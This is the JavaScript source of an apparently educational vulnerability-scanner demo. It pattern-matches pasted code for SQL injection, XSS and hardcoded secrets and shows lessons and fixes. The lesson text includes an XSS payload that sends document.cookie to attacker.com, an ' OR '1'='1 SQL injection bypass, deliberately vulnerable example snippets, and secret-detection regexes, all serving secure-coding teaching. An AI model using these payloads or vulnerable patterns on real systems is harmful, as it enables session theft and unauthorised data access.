/* ============================================================
   demo.js — Vulnerability Scanner Simulation Engine
   Avyrix — Frontend-only, no backend required
   Security note: All output uses textContent / createElement.
                  No innerHTML is ever used with user input.
   ============================================================ */

(function () {
  'use strict';
  function detectContext(code) {
    if (code.includes("Flask")) return "Python (Flask)";
    if (code.includes("express")) return "Node.js (Express)";
    if (code.includes("SELECT")) return "SQL-based backend";
    if (code.includes("innerHTML")) return "Frontend JavaScript";
    return "Generic Code";
  }

  /* ── Vulnerability Rule Database ──────────────────────── */
  const VULN_RULES = [
    {
      id: 'sql-injection',
      name: 'SQL Injection',
      severity: 'critical',
      detect(code) {
        // Detect SELECT combined with string concatenation patterns
        const hasSelect = /\bSELECT\b/i.test(code);
        const hasConcat = /(\+\s*['"`]|['"`]\s*\+|['"`]\s*\.\s*['"`]|f['"`][^'"`]*\{|%[sd].*FROM|format\s*\()/i.test(code);
        const hasFrom = /\bFROM\b/i.test(code);
        const hasWhere = /query\s*=|sql\s*=|execute\s*\(|cursor\s*\./i.test(code);
        return (hasSelect && hasFrom && hasConcat) || (hasWhere && hasConcat && hasSelect);
      },
      whatHappened: 'Your code constructs SQL queries by concatenating user input directly into the query string. This builds dynamic SQL by combining strings, which is extremely dangerous.',
      whyMatters: 'When you build SQL queries this way, you are essentially letting the user dictate part of your SQL command. An attacker can inject malicious SQL syntax to manipulate the query, allowing them to read, modify, or delete data they should not have access to.',
      howAttackExploits: 'An attacker supplies input like: \' OR \'1\'=\'1. This breaks out of your WHERE clause and makes the condition always true, bypassing authentication or returning all records. For example: SELECT * FROM users WHERE username = \'\' OR \'1\'=\'1\' (comment out the password check) allows login without credentials.',
      howToFix: [
        'Use parameterized queries (prepared statements) — they automatically escape special characters and prevent SQL injection.',
        'Never concatenate user input into SQL strings.',
        'Use an ORM library (SQLAlchemy, Prisma, Django ORM, Hibernate) that handles this safely.',
        'Validate and whitelist input on top of parameterized queries (defense in depth).',
        'Apply principle of least privilege — your database user should only have permissions it absolutely needs.',
      ],
      secureExample: `# ✓ SECURE: Using Parameterized Queries (Python with sqlite3)
import sqlite3
from flask import Flask, request

app = Flask(__name__)

@app.route('/user')
def get_user():
    username = request.args.get('username')
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # ✅ SECURE: Use ? placeholder — user input is treated as data, not code
    query = "SELECT * FROM users WHERE username = ?"
    cursor.execute(query, (username,))  # Pass user input separately
    
    user = cursor.fetchone()
    return str(user)`,
    },

    {
      id: 'xss',
      name: 'Cross-Site Scripting (XSS)',
      severity: 'critical',
      detect(code) {
        // Detect innerHTML with variable data or user input patterns
        return /\.innerHTML\s*=\s*(?!['"`]<[a-z])/i.test(code) ||
          /\.innerHTML\s*\+=/.test(code) ||
          /document\.write\s*\((?![^)]*['"`][^{)]*\))/i.test(code) ||
          /\$\(\s*['"`][^'"]+['"`]\s*\)\.html\s*\(/i.test(code);
      },
      whatHappened: 'Your code inserts user-controlled data directly into the DOM using .innerHTML or document.write(). This treats user input as HTML/JavaScript code instead of plain text.',
      whyMatters: 'The browser will parse and execute any script tags or event handlers in that HTML. An attacker can inject malicious JavaScript that runs in the context of your website, with access to that user\'s session, cookies, and sensitive data.',
      howAttackExploits: 'An attacker injects: <img src=x onerror="fetch(\'https://attacker.com?cookie=\' + document.cookie)">. When this is inserted via .innerHTML, the browser executes the onerror handler, stealing the user\'s session cookie and sending it to the attacker\'s server.',
      howToFix: [
        'Replace .innerHTML with .textContent for plain text data — textContent never executes scripts.',
        'If you must render HTML, sanitize it first with a library like DOMPurify.',
        'Use modern frameworks (React, Vue, Angular) that escape output by default.',
        'Implement Content Security Policy (CSP) headers to restrict script execution.',
        'Never use eval(), new Function(), or setTimeout with string data.',
      ],
      secureExample: `// ✓ SECURE: Using textContent instead of innerHTML
function displayUserComment(commentData) {
    const container = document.getElementById('comments');
    
    // ✅ SECURE: textContent never executes scripts — treats input as plain text
    const commentDiv = document.createElement('div');
    commentDiv.className = 'comment';
    commentDiv.textContent = commentData.text;  // Safe!
    container.appendChild(commentDiv);
    
    // Also safe:
    document.getElementById('username').textContent = commentData.author;
}

// If you must render actual HTML, sanitize it first:
import DOMPurify from 'dompurify';

function displayRichComment(commentData) {
    const container = document.getElementById('comments');
    const clean = DOMPurify.sanitize(commentData.html);  // Remove malicious tags
    container.innerHTML = clean;  // Now it's safe!
}`,
    },

    {
      id: 'secret-leak',
      name: 'Hardcoded Secret / Credential Leak',
      severity: 'high',
      detect(code) {
        // Detect API keys, tokens, passwords, secrets hardcoded in source
        return /(?:api[_-]?key|secret[_-]?key|access[_-]?token|auth[_-]?token|private[_-]?key|password|passwd|db[_-]?pass|client[_-]?secret|bearer)\s*[:=]\s*['"`][A-Za-z0-9+/=_\-\.]{8,}/i.test(code) ||
          /(['"`])(?:sk-|pk-|ghp_|xoxb-|AKIA|AIza|ya29\.|SG\.)[A-Za-z0-9_\-\.]{10,}\1/i.test(code);
      },
      whatHappened: 'Your code has an API key, password, token, or other secret hardcoded as a string literal in the source code.',
      whyMatters: 'If this code is ever committed to a repository (GitHub, GitLab, Bitbucket, etc.), the secret is permanently exposed in the repository history. Even if you delete it in a later commit, the secret remains in Git\'s history forever and can be found by attackers.',
      howAttackExploits: 'Attackers scan public repositories using automated tools (TruffleHog, GitLeaks, git-secrets) looking for secrets. Once found, they can use your API key to: access your services, make fraudulent charges, exfiltrate data, send emails in your name, or fully compromise your account.',
      howToFix: [
        'Immediately rotate the exposed secret if it has ever been in a repository.',
        'Move all secrets to environment variables (process.env.API_KEY or os.environ["API_KEY"]).',
        'Use a secrets manager: AWS Secrets Manager, HashiCorp Vault, Doppler, 1Password, or GitHub Secrets.',
        'Add .env and other secret files to .gitignore — verify they were never committed.',
        'Install pre-commit hooks (detect-secrets, git-secrets) to catch secrets before commit.',
      ],
      secureExample: `// ✓ SECURE: Using Environment Variables

// .env file (NEVER COMMIT THIS):
// API_KEY=sk-prod_actualkeyhere123
// DATABASE_PASSWORD=correcthorsebatterystaple
// STRIPE_SECRET=sk_live_xyz

// app.js — access secrets from environment, never hardcode
const stripe = require('stripe')(process.env.STRIPE_SECRET);  // From env
const dbPassword = process.env.DATABASE_PASSWORD;            // From env
const apiKey = process.env.API_KEY;                          // From env

// .gitignore — make sure these files are never committed:
// .env
// .env.local
// secrets.json
// config/secrets.yml

// Load environment variables at startup:
require('dotenv').config();  // Loads from .env file`,
    },
  ];

  /* ── Scan Engine ───────────────────────────────────────── */
  function scanCode(rawCode) {
    const code = sanitizeInput(rawCode);
    if (!code) return { error: 'Please enter some code to learn about.' };
    if (code.length < 5) return { error: 'Input too short to analyze.' };

    const findings = VULN_RULES
      .filter(rule => rule.detect(code))
      .map(rule => ({
        ...rule,
      }));

    return { code, findings };
  }

  /* ── UI Builder ────────────────────────────────────────── */

  // Build a severity bar element
  function buildSeverityBar(severity) {
    const levels = { critical: 5, high: 4, medium: 3 };
    const level = levels[severity] || 3;
    const wrapper = el('div', 'severity');
    const bar = el('div', 'severity__bar');
    for (let i = 0; i < 5; i++) {
      const seg = el('div', 'severity__seg');
      if (i < level) {
        seg.style.background = severity === 'critical' ? 'var(--accent-red)' : 'var(--accent-amber)';
      }
      bar.appendChild(seg);
    }
    const label = el('span');
    label.textContent = severity.toUpperCase();
    label.style.cssText = 'font-size:11px;font-family:var(--font-mono);color:' +
      (severity === 'critical' ? 'var(--accent-red)' : 'var(--accent-amber)') + ';letter-spacing:0.06em;';
    wrapper.appendChild(bar);
    wrapper.appendChild(label);
    return wrapper;
  }

  // Build the main lesson card with structured learning
  function buildLessonCard(finding) {
    const card = el('div', 'result-card card card--lesson');
    
    const header = el('div', 'result-card__header');
    const iconWrap = el('div', 'result-card__icon');
    iconWrap.style.background = 'var(--accent-red-dim)';
    iconWrap.textContent = '🎓';
    const titleWrap = el('div');
    const title = el('div', 'result-card__title');
    title.textContent = 'Security Lesson: ' + finding.name;
    const subtitle = el('div', 'result-card__subtitle');
    subtitle.textContent = 'Interactive learning module';
    titleWrap.appendChild(title);
    titleWrap.appendChild(subtitle);
    header.appendChild(iconWrap);
    header.appendChild(titleWrap);

    // Severity bar
    const sevWrap = el('div');
    sevWrap.style.cssText = 'margin-left:auto;flex-shrink:0;';
    sevWrap.appendChild(buildSeverityBar(finding.severity));
    header.appendChild(sevWrap);
    card.appendChild(header);

    const body = el('div', 'result-card__body');
    
    // 🚨 What Happened
    const whatSection = el('div', 'learning-section');
    const whatTitle = el('div', 'learning-section__title');
    whatTitle.innerHTML = '🚨 What Happened?';
    whatSection.appendChild(whatTitle);
    const whatContent = el('p', 'learning-section__content');
    whatContent.textContent = finding.whatHappened;
    whatSection.appendChild(whatContent);
    body.appendChild(whatSection);

    // 🧠 Why It Matters
    const whySection = el('div', 'learning-section');
    const whyTitle = el('div', 'learning-section__title');
    whyTitle.innerHTML = '🧠 Why It Matters';
    whySection.appendChild(whyTitle);
    const whyContent = el('p', 'learning-section__content');
    whyContent.textContent = finding.whyMatters;
    whySection.appendChild(whyContent);
    body.appendChild(whySection);

    // ⚠️ How Attacker Exploits It
    const howSection = el('div', 'learning-section');
    const howTitle = el('div', 'learning-section__title');
    howTitle.innerHTML = '⚠️ How Attacker Exploits It';
    howSection.appendChild(howTitle);
    const howContent = el('p', 'learning-section__content');
    howContent.textContent = finding.howAttackExploits;
    howSection.appendChild(howContent);
    body.appendChild(howSection);

    card.appendChild(body);
    return card;
  }

  // Build the "How to Fix" card
  function buildFixGuideCard(finding) {
    const card = el('div', 'result-card card card--green');

    const header = el('div', 'result-card__header');
    const iconWrap = el('div', 'result-card__icon');
    iconWrap.style.background = 'var(--accent-green-dim)';
    iconWrap.textContent = '🛠️';
    const titleWrap = el('div');
    const title = el('div', 'result-card__title');
    title.textContent = 'How to Fix It';
    const subtitle = el('div', 'result-card__subtitle');
    subtitle.textContent = 'Step-by-step remediation guide';
    titleWrap.appendChild(title);
    titleWrap.appendChild(subtitle);
    header.appendChild(iconWrap);
    header.appendChild(titleWrap);
    card.appendChild(header);

    const body = el('div', 'result-card__body');
    const ol = el('ol', 'steps-list');
    finding.howToFix.forEach(step => {
      const li = el('li');
      const text = el('span');
      text.textContent = step;
      li.appendChild(text);
      ol.appendChild(li);
    });
    body.appendChild(ol);
    card.appendChild(body);

    return card;
  }

  // Build the "Secure Example" card
  function buildSecureExampleCard(finding) {
    const wrapper = el('div', 'card');
    wrapper.style.cssText = 'border: 1px solid var(--accent-green-dim);background:rgba(0,229,160,0.02);';

    // Header with title
    const titleRow = el('div');
    titleRow.style.cssText = 'padding:20px 20px 0;display:flex;align-items:center;gap:10px;margin-bottom:12px;';
    const titleIcon = el('span');
    titleIcon.textContent = '✅';
    titleIcon.style.fontSize = '16px';
    const titleText = el('span');
    titleText.style.cssText = 'font-size:14px;font-weight:600;color:var(--accent-green);font-family:var(--font-display);';
    titleText.textContent = 'Secure Example';
    titleRow.appendChild(titleIcon);
    titleRow.appendChild(titleText);
    wrapper.appendChild(titleRow);

    // Code block
    const block = el('div', 'code-block');
    block.style.cssText = 'border:none;border-radius:0;margin:0;';

    const blockHeader = el('div', 'code-block__header');
    const dots = el('div', 'code-block__dots');
    ['dot1', 'dot2', 'dot3'].forEach(() => dots.appendChild(el('div', 'code-block__dot')));
    const langLabel = el('span', 'code-block__lang');
    langLabel.textContent = '✓ secure-code.example';

    const copyBtn = el('button', 'copy-btn');
    copyBtn.textContent = '⎘ Copy';
    copyBtn.addEventListener('click', () => copyToClipboard(finding.secureExample, copyBtn));

    blockHeader.appendChild(dots);
    blockHeader.appendChild(langLabel);
    blockHeader.appendChild(copyBtn);
    block.appendChild(blockHeader);

    const bodyEl = el('div', 'code-block__body');
    bodyEl.textContent = finding.secureExample;
    block.appendChild(bodyEl);
    wrapper.appendChild(block);

    return wrapper;
  }

  // Build the "Vulnerability Found" card (Red)
  function buildVulnCard(finding, code) {
    const card = el('div', 'result-card card card--red');

    // Header
    const header = el('div', 'result-card__header');
    const iconWrap = el('div', 'result-card__icon');
    iconWrap.style.background = 'var(--accent-red-dim)';
    iconWrap.textContent = '🚨';
    const titleWrap = el('div');
    const title = el('div', 'result-card__title');
    title.textContent = finding.name + ' Risk Pattern';
    const subtitle = el('div', 'result-card__subtitle');
    subtitle.textContent = 'Potential security risk based on detected code patterns';
    titleWrap.appendChild(title);
    titleWrap.appendChild(subtitle);
    header.appendChild(iconWrap);
    header.appendChild(titleWrap);

    // Severity bar
    const sevWrap = el('div');
    sevWrap.style.cssText = 'margin-left:auto;flex-shrink:0;';
    sevWrap.appendChild(buildSeverityBar(finding.severity));
    header.appendChild(sevWrap);
    card.appendChild(header);

    // Body: badge + description
    const body = el('div', 'result-card__body');
    const badge = el('span', 'badge badge--red badge--dot');
    badge.textContent = finding.id.toUpperCase().replace(/-/g, ' ');
    badge.style.marginBottom = '14px';
    body.appendChild(badge);

    const desc = el('p');
    desc.style.cssText = 'font-size:14px;color:var(--text-secondary);margin-top:12px;line-height:1.7;';
    const context = detectContext(code);

    desc.textContent =
      `⚠️ We detected a pattern in your code that is commonly associated with ${finding.name} vulnerabilities. ` +
      `In real-world applications, this type of pattern can sometimes introduce security risks if not handled carefully. ` +
      `Let’s break down what this means and how to fix it below.`;
    body.appendChild(desc);
    const note = el('div');
    note.style.cssText = 'margin-top:10px;font-size:12px;color:var(--text-muted);';
    note.textContent =
      'Note: This is a pattern-based detection for learning purposes.';
    body.appendChild(note);
    card.appendChild(body);
    const meta = el('div');
    meta.style.cssText = 'margin-top:10px;font-size:12px;color:var(--text-muted);';

    meta.textContent =
      'Confidence: High • Based on pattern similarity • Context: ' + detectContext(code);

    body.appendChild(meta);

    return card;
  }

  // Build the "Explanation" card (Blue)
  function buildExplanationCard(finding) {
    const card = el('div', 'result-card card card--blue');

    const header = el('div', 'result-card__header');
    const iconWrap = el('div', 'result-card__icon');
    iconWrap.style.background = 'var(--accent-blue-dim)';
    iconWrap.textContent = '🧠';
    const titleWrap = el('div');
    const title = el('div', 'result-card__title');
    title.textContent = 'What This Means';
    const subtitle = el('div', 'result-card__subtitle');
    subtitle.textContent = 'Security impact and attack scenario';
    titleWrap.appendChild(title);
    titleWrap.appendChild(subtitle);
    header.appendChild(iconWrap);
    header.appendChild(titleWrap);
    card.appendChild(header);

    const body = el('div', 'result-card__body');
    const list = el('ul');
    list.style.cssText = 'list-style:none;display:flex;flex-direction:column;gap:10px;';
    finding.explanation.forEach((point, i) => {
      const li = el('li');
      li.style.cssText = 'display:flex;gap:12px;font-size:14px;color:var(--text-secondary);line-height:1.65;';
      const num = el('span');
      num.style.cssText = 'flex-shrink:0;width:20px;height:20px;border-radius:50%;background:var(--accent-blue-dim);border:1px solid rgba(77,158,255,0.3);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;color:var(--accent-blue);margin-top:2px;';
      num.textContent = String(i + 1);
      const text = el('span');
      text.textContent = point; // textContent — safe
      li.appendChild(num);
      li.appendChild(text);
      list.appendChild(li);
    });
    body.appendChild(list);
    card.appendChild(body);

    return card;
  }

  // Build the "Fix Steps" card (Green)
  function buildFixStepsCard(finding) {
    const card = el('div', 'result-card card card--green');

    const header = el('div', 'result-card__header');
    const iconWrap = el('div', 'result-card__icon');
    iconWrap.style.background = 'var(--accent-green-dim)';
    iconWrap.textContent = '🛠️';
    const titleWrap = el('div');
    const title = el('div', 'result-card__title');
    title.textContent = 'How to Fix It';
    const subtitle = el('div', 'result-card__subtitle');
    subtitle.textContent = 'Step-by-step remediation guide';
    titleWrap.appendChild(title);
    titleWrap.appendChild(subtitle);
    header.appendChild(iconWrap);
    header.appendChild(titleWrap);
    card.appendChild(header);

    const body = el('div', 'result-card__body');
    const ol = el('ol', 'steps-list');
    finding.steps.forEach(step => {
      const li = el('li');
      const text = el('span');
      text.textContent = step; // textContent — safe
      li.appendChild(text);
      ol.appendChild(li);
    });
    body.appendChild(ol);
    card.appendChild(body);

    return card;
  }

  // Build the "Fixed Code" block
  function buildFixedCodeCard(finding) {
    const wrapper = el('div', 'card');
    wrapper.style.padding = '0';
    wrapper.style.overflow = 'hidden';

    const block = el('div', 'code-block');
    block.style.border = 'none';
    block.style.borderRadius = '0';
    block.style.margin = '0';

    const blockHeader = el('div', 'code-block__header');
    const dots = el('div', 'code-block__dots');
    ['dot1', 'dot2', 'dot3'].forEach(() => dots.appendChild(el('div', 'code-block__dot')));
    const langLabel = el('span', 'code-block__lang');
    langLabel.textContent = '📋 fixed code';

    const copyBtn = el('button', 'copy-btn');
    copyBtn.textContent = '⎘ Copy';
    copyBtn.addEventListener('click', () => copyToClipboard(finding.fixedCode, copyBtn));

    blockHeader.appendChild(dots);
    blockHeader.appendChild(langLabel);
    blockHeader.appendChild(copyBtn);
    block.appendChild(blockHeader);

    const bodyEl = el('div', 'code-block__body');
    bodyEl.textContent = finding.fixedCode; // textContent — safe
    block.appendChild(bodyEl);
    wrapper.appendChild(block);

    return wrapper;
  }

  // Build "All Clear" state
  function buildAllClear() {
    const card = el('div', 'card');
    card.style.cssText = 'text-align:center;padding:48px 24px;border-color:rgba(0,229,160,0.2);background:rgba(0,229,160,0.04);';
    const icon = el('div');
    icon.style.cssText = 'font-size:40px;margin-bottom:16px;';
    icon.textContent = '✅';
    const title = el('h3');
    title.style.cssText = 'font-family:var(--font-display);font-size:20px;font-weight:700;color:var(--accent-green);margin-bottom:10px;';
    title.textContent = 'No common risk patterns detected';
    const desc = el('p');
    desc.style.cssText = 'font-size:14px;color:var(--text-secondary);max-width:380px;margin:0 auto;line-height:1.7;';
    desc.textContent =
      'No common vulnerability patterns were detected in this snippet. Security issues often depend on full application context — always review critical logic carefully.';
    card.appendChild(icon);
    card.appendChild(title);
    card.appendChild(desc);
    return card;
  }

  /* ── Render results into DOM ───────────────────────────── */
  function renderResults(container, result) {
    // Clear previous results safely
    while (container.firstChild) container.removeChild(container.firstChild);

    if (result.error) {
      const alert = el('div', 'alert alert--error');
      alert.textContent = result.error;
      container.appendChild(alert);
      return;
    }

    if (result.findings.length === 0) {
      container.appendChild(buildAllClear());
      return;
    }

    // Summary header — emphasize learning
    const summary = el('div');
    summary.style.cssText = 'display:flex;align-items:center;gap:12px;margin-bottom:16px;flex-wrap:wrap;';
    const countBadge = el('span', 'badge badge--red badge--dot');
    countBadge.textContent = '📚 ' + result.findings.length + ' Learning Lesson' + (result.findings.length > 1 ? 's' : '');
    const subtitle = el('span');
    subtitle.style.cssText = 'font-size:13px;color:var(--text-muted);';
    subtitle.textContent = 'Let\'s learn how to fix these patterns';
    summary.appendChild(countBadge);
    summary.appendChild(subtitle);
    container.appendChild(summary);

    // Render each finding with educational structure
    result.findings.forEach((finding, idx) => {
      const findingWrapper = el('div', 'scan-results');
      
      // Main lesson card
      findingWrapper.appendChild(buildLessonCard(finding));
      
      // Fix guide
      findingWrapper.appendChild(buildFixGuideCard(finding));
      
      // Secure example
      findingWrapper.appendChild(buildSecureExampleCard(finding));

      container.appendChild(findingWrapper);
    });
  }

  /* ── Scan button handler ───────────────────────────────── */
  function initScanner() {
    const codeInput = document.getElementById('code-input');
    const scanBtn = document.getElementById('scan-btn');
    const results = document.getElementById('scan-results');
    const charCount = document.getElementById('char-count');

    if (!codeInput || !scanBtn || !results) return;

    // Live character count
    if (charCount) {
      codeInput.addEventListener('input', () => {
        const len = codeInput.value.length;
        charCount.textContent = len.toLocaleString() + ' chars';
        charCount.style.color = len > 40000 ? 'var(--accent-red)' : 'var(--text-muted)';
      });
    }

    // Insert example code snippets
    document.querySelectorAll('[data-example]').forEach(btn => {
      btn.addEventListener('click', () => {
        const exampleKey = btn.dataset.example;
        codeInput.value = CODE_EXAMPLES[exampleKey] || '';
        codeInput.dispatchEvent(new Event('input'));
        codeInput.focus();
        codeInput.scrollTop = 0;
      });
    });

    // Clear button
    const clearBtn = document.getElementById('clear-btn');
    if (clearBtn) {
      clearBtn.addEventListener('click', () => {
        codeInput.value = '';
        codeInput.dispatchEvent(new Event('input'));
        while (results.firstChild) results.removeChild(results.firstChild);
        buildEmptyState(results);
      });
    }

    // Main scan action

    // Debounce : Prevent spam
    let lastScan = 0;
    scanBtn.addEventListener('click', async () => {
      const now = Date.now();
      if (now - lastScan < 1500) return; // prevent spam
      lastScan = now;
      const code = codeInput.value;
      const languageSelect = document.getElementById('language-select');
      const language = languageSelect ? languageSelect.value : 'python';

      // Basic frontend validation
      if (!code.trim()) {
        codeInput.style.borderColor = 'var(--accent-red)';
        codeInput.style.boxShadow = '0 0 0 3px var(--accent-red-dim)';
        setTimeout(() => {
          codeInput.style.borderColor = '';
          codeInput.style.boxShadow = '';
        }, 2000);
        return;
      }

      if (code.length > 500000) {
        const errBox = el('div', 'alert alert--error');
        errBox.textContent = 'Input too large. Please shorten the snippet (max 500k chars).';
        while (results.firstChild) results.removeChild(results.firstChild);
        results.appendChild(errBox);
        return;
      }

      // Analytics
      gtag('event', 'scan_clicked', { event_category: 'engagement', event_label: 'scan_button' });

      // Show loading state
      scanBtn.disabled = true;
      scanBtn.style.opacity = '0.7';
      const originalHTML = scanBtn.innerHTML;
      scanBtn.innerHTML = '';
      const spinner = el('span', 'spinner');
      const loadText = el('span');
      loadText.textContent = 'Scanning...';
      scanBtn.appendChild(spinner);
      scanBtn.appendChild(loadText);

      try {
        // Attempt remote scan via backend API
        const resp = await DevSecureAPI.postScan({ language, code, filename: null }, 20000);

        // Map backend scan_results to the demo UI format
        const mapped = (resp.scan_results || []).map(item => ({
          id: item.vulnerability.toLowerCase().replace(/\s+/g, '-'),
          name: item.vulnerability,
          severity: (item.severity || 'medium').toLowerCase(),
          whatHappened: item.simple_explanation || item.vulnerability,
          whyMatters: item.learning_tip || '',
          howAttackExploits: item.attack_scenario || '',
          howToFix: item.fix_steps || [],
          secureExample: item.secure_code_example || '',
        }));

        renderResults(results, { findings: mapped, code });

        gtag('event', 'scan_completed', { event_category: 'engagement', event_label: 'code_scanned' });
      } catch (err) {
        console.error(err);
        while (results.firstChild) results.removeChild(results.firstChild);
        const errorBox = el('div', 'alert alert--error');
        if (err.code === 'timeout') {
          errorBox.textContent = 'Scan timed out. Try a smaller snippet or increase the timeout.';
        } else if (err.code === 401 || err.code === 403) {
          errorBox.textContent = 'Authentication error: missing or invalid API key. Configure your API key.';
        } else if (err.code === 429) {
          errorBox.textContent = 'Rate limit exceeded. Please wait a moment and try again.';
        } else {
          errorBox.textContent = err.message || 'Something went wrong while analyzing the code. Please try again.';
        }
        results.appendChild(errorBox);
      }

      // Restore button
      scanBtn.innerHTML = originalHTML;
      scanBtn.disabled = false;
      scanBtn.style.opacity = '';

      // Scroll results into view
      results.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    });
  }

  // Build initial empty state
  function buildEmptyState(container) {
    const empty = el('div', 'empty-state');
    const icon = el('div', 'empty-state__icon');
    icon.textContent = '�';
    const title = el('div', 'empty-state__title');
    title.textContent = 'Ready to learn secure coding?';
    const desc = el('div', 'empty-state__desc');
    desc.textContent =
      'Paste your code and explore interactive security lessons. Learn what vulnerabilities are, why they matter, how attackers exploit them, and the right way to fix them. Try the examples below to get started!';
    empty.appendChild(icon);
    empty.appendChild(title);
    empty.appendChild(desc);
    container.appendChild(empty);
  }

  /* ── Example code snippets ─────────────────────────────── */
  const CODE_EXAMPLES = {
    sqli: `# Python — Flask route with SQL Injection
import sqlite3
from flask import Flask, request

app = Flask(__name__)

@app.route('/user')
def get_user():
    username = request.args.get('username')
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # VULNERABLE: direct string concatenation
    query = "SELECT * FROM users WHERE username = '" + username + "'"
    cursor.execute(query)
    
    user = cursor.fetchone()
    return str(user)`,

    xss: `// JavaScript — Dynamic content rendering
function loadUserComment(commentData) {
    const container = document.getElementById('comments');
    
    // VULNERABLE: innerHTML with user data
    container.innerHTML += '<div class="comment">' + commentData.text + '</div>';
    
    // Also vulnerable:
    document.getElementById('username').innerHTML = commentData.author;
    
    // Another issue:
    document.write('<p>' + commentData.date + '</p>');
}

// Called when comment loads from API
fetch('/api/comments').then(r => r.json()).then(data => {
    data.forEach(comment => loadUserComment(comment));
});`,

    secret: `// Node.js — API client with hardcoded secrets
const stripe = require('stripe');
const sendgrid = require('@sendgrid/mail');
const aws = require('aws-sdk');

// VULNERABLE: hardcoded credentials
const stripeClient = stripe('sk-prod_4xT8kLmNpQrSvWyZ1234567890abcdef');

sendgrid.setApiKey('SG.xK8mP2qR_tNvYw.AbCdEfGhIjKlMnOpQrStUvWxYz1234567890-ABCDEF');

const s3 = new aws.S3({
    accessKeyId: 'AKIAIOSFODNN7EXAMPLE',
    secretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
    region: 'us-east-1'
});

const DB_PASSWORD = 'Sup3rS3cr3tP@ssw0rd!';`,
  };

  /* ── Boot ──────────────────────────────────────────────── */
  document.addEventListener('DOMContentLoaded', () => {
    const results = document.getElementById('scan-results');
    if (results) buildEmptyState(results);
    initScanner();
  });
})();

// Simple feedback from users
      function sendFeedback(type) {
        gtag('event', 'feedback', {
          event_category: 'engagement',
          event_label: type
        });
      }
